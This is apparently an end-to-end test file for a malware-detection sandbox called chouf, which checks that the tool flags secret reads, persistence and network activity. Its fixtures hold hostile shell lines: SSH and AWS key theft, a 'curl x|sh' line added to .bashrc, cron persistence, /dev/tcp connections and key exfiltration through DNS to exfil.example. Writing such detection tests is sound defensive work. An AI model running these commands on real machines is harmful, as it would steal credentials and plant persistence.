//! Real runs through podman. Needs rootless podman and pulls ubuntu:24.04 once: `cargo test -- --include-ignored`.

use std::path::PathBuf;
use std::process::Command;

static RUN: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

fn chouf(args: &[&str]) -> (i32, String, serde_json::Value) {
    chouf_env(args, &[])
}

fn chouf_env(args: &[&str], env: &[(&str, &str)]) -> (i32, String, serde_json::Value) {
    // tests run in parallel: each run gets its own data directory
    let n = RUN.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
    let data = std::env::temp_dir().join(format!("chouf-e2e-{}-{n}", std::process::id()));
    let out = Command::new(env!("CARGO_BIN_EXE_chouf"))
        .args(args)
        .env("CHOUF_DATA", &data)
        .env("CHOUF_LANG", "en") // the assertions read the English report; the machine may be set to French
        .envs(env.iter().copied())
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    let session = text
        .lines()
        .find_map(|l| l.strip_prefix("session: ").map(|r| r.split("  (").next().unwrap()))
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            panic!(
                "no session:\n{text}\n{}",
                String::from_utf8_lossy(&out.stderr)
            )
        });
    let json =
        serde_json::from_slice(&std::fs::read(session.join("report.json")).unwrap()).unwrap();
    let _ = std::fs::remove_dir_all(data);
    (out.status.code().unwrap(), text, json)
}

fn has(j: &serde_json::Value, kind: &str, path: &str) -> bool {
    j["findings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|f| f["kind"] == kind && f["path"] == path)
}

#[test]
#[ignore]
fn a_stealer_is_caught() {
    let script = "cat ~/.ssh/id_ed25519 > /dev/null; echo 'curl x|sh' >> ~/.bashrc; \
                  echo '* * * * * root /x' > /etc/cron.d/u; echo ok > /usr/local/bin/tool";
    let (code, text, j) = chouf(&["run", "--no-net", "--", "sh", "-c", script]);
    assert_eq!(code, 1, "{text}");
    assert!(has(&j, "secret", "~/.ssh/id_ed25519"), "{text}");
    assert!(has(&j, "persistence", "~/.bashrc"), "{text}");
    assert!(has(&j, "persistence", "/etc/cron.d/u"), "{text}");
    assert!(has(&j, "other", "/usr/local/bin/tool"), "{text}");
    assert_eq!(
        j["findings"].as_array().unwrap().len(),
        4,
        "only what it did:\n{text}"
    );
    assert_eq!(j["exit_code"], 0);
    assert_eq!(j["token"].as_str().unwrap().len(), 16);
}

#[test]
#[ignore]
fn a_quiet_program_is_clean() {
    let (code, text, j) = chouf(&[
        "run",
        "--no-net",
        "--",
        "sh",
        "-c",
        "ls / > /dev/null; cat /etc/os-release; echo hi > /tmp/scratch",
    ]);
    assert_eq!(code, 0, "{text}");
    let f = j["findings"].as_array().unwrap();
    assert!(f.iter().all(|f| f["kind"] == "other"), "{text}");
    assert!(text.contains("/tmp/scratch"));
}

#[test]
#[ignore]
fn the_time_limit_holds() {
    let t = std::time::Instant::now();
    let (_, text, j) = chouf(&["run", "--no-net", "--timeout", "2", "--", "sleep", "60"]);
    assert_eq!(j["timed_out"], true, "{text}");
    assert!(j["exit_code"].is_null());
    assert!(t.elapsed().as_secs() < 30);
}

/// Needs the kernel tracer too (sudo ./trace/install.sh); skipped with a message when it is not running.
#[test]
#[ignore]
fn the_tracer_names_who_did_it_and_where_it_connected() {
    if !std::path::Path::new("/run/chouf-trace.sock").exists() {
        eprintln!("skipped: chouf-trace is not running");
        return;
    }
    // a subshell reads the key, a child of the script writes .bashrc, bash connects to the sandbox's DNS forwarder
    let script = "k=$(cat ~/.ssh/id_ed25519); sh -c 'echo x >> ~/.bashrc'; \
                  bash -c 'exec 3<>/dev/tcp/169.254.1.1/53' 2>/dev/null; exit 3";
    let (code, text, j) = chouf(&["run", "--", "sh", "-c", script]);
    assert_eq!(code, 1, "{text}");
    let by = |path: &str| -> Vec<String> {
        let f = j["findings"].as_array().unwrap().iter().find(|f| f["path"] == path).unwrap_or_else(|| panic!("{path}:\n{text}"));
        f["by"].as_array().unwrap().iter().map(|b| b.as_str().unwrap().to_string()).collect()
    };
    assert_eq!(by("~/.ssh/id_ed25519"), vec!["cat /root/.ssh/id_ed25519"], "{text}");
    assert_eq!(by("~/.bashrc"), vec!["sh -c echo x >> ~/.bashrc"], "{text}");
    let a = &j["activity"];
    let programs: Vec<(u64, &str)> = a["programs"].as_array().unwrap().iter()
        .map(|p| (p["depth"].as_u64().unwrap(), p["command"].as_str().unwrap())).collect();
    assert_eq!(programs[0].0, 0, "{text}");
    assert!(programs[0].1.starts_with("sh -c k=$(cat"), "{text}");
    for child in ["cat /root/.ssh/id_ed25519", "sh -c echo x >> ~/.bashrc", "bash -c exec 3<>/dev/tcp/169.254.1.1/53"] {
        assert!(programs.contains(&(1, child)), "{child} not under the script:\n{text}");
    }
    assert_eq!(a["programs"][0]["exit"], 3, "the script's exit code:\n{text}");
    let conns = a["connections"].as_array().unwrap();
    assert!(conns.iter().any(|c| c["ip"] == "169.254.1.1" && c["port"] == 53 && c["by"].as_str().unwrap().starts_with("bash -c")), "{text}");
    assert_eq!(a["events_lost"], false);
}

#[test]
#[ignore]
fn without_the_tracer_the_report_says_so() {
    // a socket path nobody serves stands for "not installed"
    let (_, text, j) = chouf_env(&["run", "--no-net", "--", "true"], &[("CHOUF_TRACE_SOCK", "/nonexistent/chouf-trace.sock")]);
    assert!(j["activity"]["unavailable"].as_str().unwrap().contains("chouf-trace"), "{text}");
}

/// The explorer's loop end to end, with a scripted model: no network, no key, same answers every time.
#[test]
#[ignore]
fn the_explorer_types_answers_waits_and_reports_its_verdict() {
    let dir = std::env::temp_dir().join(format!("chouf-explore-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let tool = dir.join("tool");
    std::fs::write(&tool, "case \"$1\" in\n  ask) printf 'Continue? [y/N] '; read a; [ \"$a\" = y ] && cat ~/.aws/credentials > /dev/null && echo yes;;\n  *) echo 'usage: tool ask';;\nesac\n").unwrap();
    let script = dir.join("answers.jsonl");
    std::fs::write(&script, [
        r#"{"action":"run","argv":["sh","/input/tool","ask"],"stdin":"y\n","why":"answer the prompt"}"#,
        r#"{"action":"wait","seconds":1,"why":"anything later?"}"#,
        r#"{"action":"stop","why":"seen enough"}"#,
        r#"{"level":"suspicious","summary":"It reads AWS keys after a yes.","points":[{"says":"asks to continue","does":"reads ~/.aws/credentials","assessment":"unexplained"}]}"#,
    ].join("\n")).unwrap();
    let (code, text, j) = chouf_env(
        &["explore", "--no-net", "--file", tool.to_str().unwrap(), "--", "sh", "/input/tool"],
        &[("CHOUF_FAKE_LLM", script.to_str().unwrap())],
    );
    assert_eq!(code, 1, "{text}");
    let steps: Vec<&str> = j["exploration"]["steps"].as_array().unwrap().iter().map(|s| s["did"].as_str().unwrap()).collect();
    assert_eq!(steps.len(), 3, "{text}");
    assert!(steps[1].starts_with("$ sh /input/tool ask  (typed \"y\\n\") · exit 0"), "{text}");
    assert!(steps[2].starts_with("waited 1 s"), "{text}");
    assert!(has(&j, "secret", "~/.aws/credentials"), "the typed answer reached the program:\n{text}");
    assert_eq!(j["exploration"]["verdict"]["level"], "suspicious");
    assert!(text.contains("SUSPICIOUS"), "{text}");
    // the program's output reached the model fenced as untrusted
    let prompts = std::fs::read_to_string(script.with_extension("prompts")).unwrap();
    assert!(prompts.contains("<<<UNTRUSTED\nusage: tool ask"), "{prompts}");
    let _ = std::fs::remove_dir_all(dir);
}

/// The guard: the sandbox cannot reach the local network (private ranges), the attempt is reported and named.
#[test]
#[ignore]
fn the_local_network_is_out_of_reach() {
    if !std::path::Path::new("/run/chouf-trace.sock").exists() {
        eprintln!("skipped: chouf-trace is not running");
        return;
    }
    let script = "bash -c 'exec 3<>/dev/tcp/10.255.255.1/80' 2>/dev/null && exit 7; exit 0";
    let (code, text, j) = chouf(&["run", "--", "sh", "-c", script]);
    assert_eq!(j["exit_code"], 0, "the connection went through:\n{text}");
    assert_eq!(code, 1, "probing the local network is an alarm:\n{text}");
    let b = &j["activity"]["blocked"][0];
    assert_eq!((b["ip"].as_str(), b["port"].as_u64(), b["proto"].as_str()), (Some("10.255.255.1"), Some(80), Some("tcp")), "{text}");
    assert!(b["by"].as_str().unwrap().starts_with("bash -c exec 3<>/dev/tcp/10.255.255.1/80"), "{text}");
    assert!(text.contains("It tried to reach your local network 1 time") && !text.contains("Nothing alarming"), "{text}");
    // and with --allow-lan the guard is off: nothing is refused
    let (_, text, j) = chouf(&["run", "--allow-lan", "--timeout", "20", "--", "sh", "-c", "timeout 3 bash -c 'exec 3<>/dev/tcp/10.255.255.1/80' 2>/dev/null; exit 0"]);
    assert!(j["activity"]["blocked"].as_array().unwrap().is_empty(), "{text}");
}


/// What a program set up to come back is set off once: a cron job and a .bashrc line that steal later are caught.
#[test]
#[ignore]
fn a_patient_thief_is_caught_by_setting_off_what_it_left() {
    let script = "mkdir -p /usr/local/lib/fs && printf '#!/bin/sh\\ncat ~/.aws/credentials >/dev/null\\n' > /usr/local/lib/fs/sync \
                  && chmod +x /usr/local/lib/fs/sync && echo '17 * * * * root /usr/local/lib/fs/sync' > /etc/cron.d/fs \
                  && echo 'cat ~/.ssh/id_ed25519 >/dev/null 2>&1' >> ~/.bashrc";
    let (code, text, j) = chouf(&["run", "--no-net", "--", "sh", "-c", script]);
    assert_eq!(code, 1, "{text}");
    let triggered: Vec<&str> = j["triggered"].as_array().unwrap().iter().map(|t| t["did"].as_str().unwrap()).collect();
    assert!(triggered.iter().any(|t| t.contains("bash -i -c true")), "{text}");
    assert!(triggered.iter().any(|t| t.contains("sh -c /usr/local/lib/fs/sync")), "{text}");
    assert!(has(&j, "secret", "~/.aws/credentials") && has(&j, "secret", "~/.ssh/id_ed25519"), "{text}");
    if std::path::Path::new("/run/chouf-trace.sock").exists() {
        let f = j["findings"].as_array().unwrap().iter().find(|f| f["path"] == "~/.aws/credentials").unwrap();
        assert_eq!(f["by"][0], "cat /root/.aws/credentials", "{text}");
        assert!(!text.contains("head -c 65536"), "chouf's own reads stay out:\n{text}");
    }
}

/// Proof of theft: a bait's mark seen in what the sandbox sends, here hidden in a DNS question (a real exfiltration
/// trick, and the resolver is always reachable).
#[test]
#[ignore]
fn a_secret_leaving_the_machine_is_proven() {
    if !std::path::Path::new("/run/chouf-trace.sock").exists() {
        eprintln!("skipped: chouf-trace is not running");
        return;
    }
    // the AWS bait holds "AKIA<MARK>"; its lower-case mark becomes a DNS label
    let script = "m=$(grep -o 'AKIA[0-9A-F]*' ~/.aws/credentials | cut -c5- | tr A-F a-f); getent hosts \"$m.exfil.example\" >/dev/null; exit 0";
    let (code, text, j) = chouf(&["run", "--", "bash", "-c", script]);
    assert_eq!(code, 1, "{text}");
    assert!(text.contains("PROOF: a secret left the machine") && text.contains("your AWS access keys"), "{text}");
    let l = &j["activity"]["leaks"][0];
    assert_eq!(l["port"], 53, "{text}");
    assert!(l["by"].as_str().unwrap().starts_with("getent hosts"), "{text}");
}

#[test]
#[ignore]
fn the_report_speaks_french_when_asked() {
    let (_, text, j) = chouf_env(&["run", "--no-net", "--", "sh", "-c", "cat ~/.ssh/id_ed25519 >/dev/null"], &[("CHOUF_LANG", "fr")]);
    assert!(text.contains("En bref") && text.contains("Les secrets qu'il a fouillés") && text.contains("(clé privée SSH)"), "{text}");
    assert!(text.contains("remplace tes clés SSH et GPG"), "{text}");
    assert_eq!(j["findings"][0]["why"], "SSH private key", "report.json stays in English");
}

